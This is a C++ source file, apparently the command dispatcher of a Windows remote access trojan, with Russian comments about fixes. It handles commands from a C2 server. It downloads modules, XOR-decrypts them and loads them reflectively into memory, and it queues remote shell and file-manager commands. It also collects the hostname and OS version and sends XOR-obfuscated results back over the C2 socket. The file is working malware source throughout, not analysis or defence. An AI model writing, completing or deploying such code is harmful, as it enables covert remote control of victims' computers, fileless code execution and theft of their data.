// Core/commands.cpp — FINAL FIX
#include "commands.h"
#include "loader.h"
#include "network.h"
#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <queue>
#include <map>

extern SOCKET g_c2_socket;

// ==========================================
// MODULE COMMAND QUEUE
// ==========================================
static CRITICAL_SECTION g_module_cmd_cs;
// ✅ ИСПРАВЛЕНО: Правильный синтаксис map<string, queue<string>>
static std::map<std::string, std::queue<std::string>> g_module_commands;

static void init_module_commands() { InitializeCriticalSection(&g_module_cmd_cs); }

static void push_module_command(const std::string& module, const std::string& cmd) {
    EnterCriticalSection(&g_module_cmd_cs);
    g_module_commands[module].push(cmd);
    LeaveCriticalSection(&g_module_cmd_cs);
}

static const char* module_get_command(const char* module_name) {
    static char result[1024] = {0};
    EnterCriticalSection(&g_module_cmd_cs);
    auto it = g_module_commands.find(module_name);
    if (it != g_module_commands.end() && !it->second.empty()) {
        std::string cmd = it->second.front();
        it->second.pop();
        strncpy_s(result, cmd.c_str(), sizeof(result) - 1);
        LeaveCriticalSection(&g_module_cmd_cs);
        return result;
    }
    LeaveCriticalSection(&g_module_cmd_cs);
    return "";
}

// ==========================================
// CALLBACKS
// ==========================================
static void module_log(const char* msg) {
    OutputDebugStringA("[MODULE] "); OutputDebugStringA(msg); OutputDebugStringA("\n");
}

static void module_send_result(const uint8_t* data, size_t len) {
    if (g_c2_socket == INVALID_SOCKET) return;
    // ... (твоя логика отправки без изменений)
    bool only_ws = true;
    for (size_t i = 0; i < len; i++) {
        char c = data[i];
        if (c != ' ' && c != '\t' && c != '\r' && c != '\n') { only_ws = false; break; }
    }
    if (only_ws) return;
    
    bool has_nl = (len > 0 && data[len - 1] == '\n');
    size_t total_len = has_nl ? len : len + 1;
    std::vector<uint8_t> enc(total_len);
    for (size_t i = 0; i < len; i++) enc[i] = data[i] ^ 0xAA;
    if (!has_nl) enc[len] = '\n' ^ 0xAA;
    push_to_send_queue(enc, 1);
}

// ==========================================
// DISPATCHER
// ==========================================
typedef struct _MY_OSVERSIONINFOW {
    ULONG dwOSVersionInfoSize; ULONG dwMajorVersion; ULONG dwMinorVersion; 
    ULONG dwBuildNumber; ULONG dwPlatformId; WCHAR szCSDVersion[128];
} MY_OSVERSIONINFOW;
typedef NTSTATUS (NTAPI* pRtlGetVersion)(MY_OSVERSIONINFOW*);

std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
    static bool cmds_inited = false;
    if (!cmds_inited) { init_module_commands(); cmds_inited = true; }

    if (cmd == "ping") return "pong";

    if (cmd.rfind("LOAD_MODULE ", 0) == 0) {
        std::string module_name = cmd.substr(12);
        std::vector<uint8_t> dll_data;
        if (!download_module(module_name, dll_data)) return "MODULE_DOWNLOAD_FAILED";
        xor_decrypt(dll_data);
        void* modbase = nullptr;
        if (!load_reflective_dll(dll_data, modbase)) return "MODULE_LOAD_FAILED";
        
        // 🔑 ИСПРАВЛЕНО: Инициализация должна совпадать со структурой в loader.h
        static ModuleAPI g_module_api = { module_send_result, module_log, module_get_command };
        
        if (!execute_module(modbase, g_module_api)) return "MODULE_EXECUTION_FAILED";
        return "MODULE_LOADED_OK";
    }

    if (cmd.rfind("shell_exec:", 0) == 0) { push_module_command("shell", cmd); return "SHELL_COMMAND_QUEUED"; }
    if (cmd == "shell_stop") { push_module_command("shell", "shell_stop"); return "SHELL_STOP_QUEUED"; }
    if (cmd.rfind("filemgr:", 0) == 0) { push_module_command("filemgr", cmd); return "FILEMGR_COMMAND_QUEUED"; }

    if (cmd == "info") {
        char host[MAX_COMPUTERNAME_LENGTH + 1]; DWORD s = sizeof(host);
        if (!GetComputerNameA(host, &s)) strcpy_s(host, "Unknown");
        ULONG maj = 0, min = 0, bld = 0;
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) {
            pRtlGetVersion rv = (pRtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
            if (rv) { MY_OSVERSIONINFOW rovi = {0}; rovi.dwOSVersionInfoSize = sizeof(rovi); if (rv(&rovi) == 0) { maj=rovi.dwMajorVersion; bld=rovi.dwBuildNumber; } }
        }
        std::string os = (maj==10 && bld>=22000) ? "Windows 11 " : "Windows 10 ";
        char buf[256]; sprintf_s(buf, "hostname=%s; os=%s Build %d", host, os.c_str(), bld);
        return std::string(buf);
    }
    if (cmd == "uninstall") return "UNINSTALLING";
    return "UNKNOWN_COMMAND";
}

void process_command(const std::string& cmd, SOCKET sock) {
    std::string res = execute_builtin_command(cmd, sock);
    if (!res.empty()) send_encrypted(sock, res + "\n");
}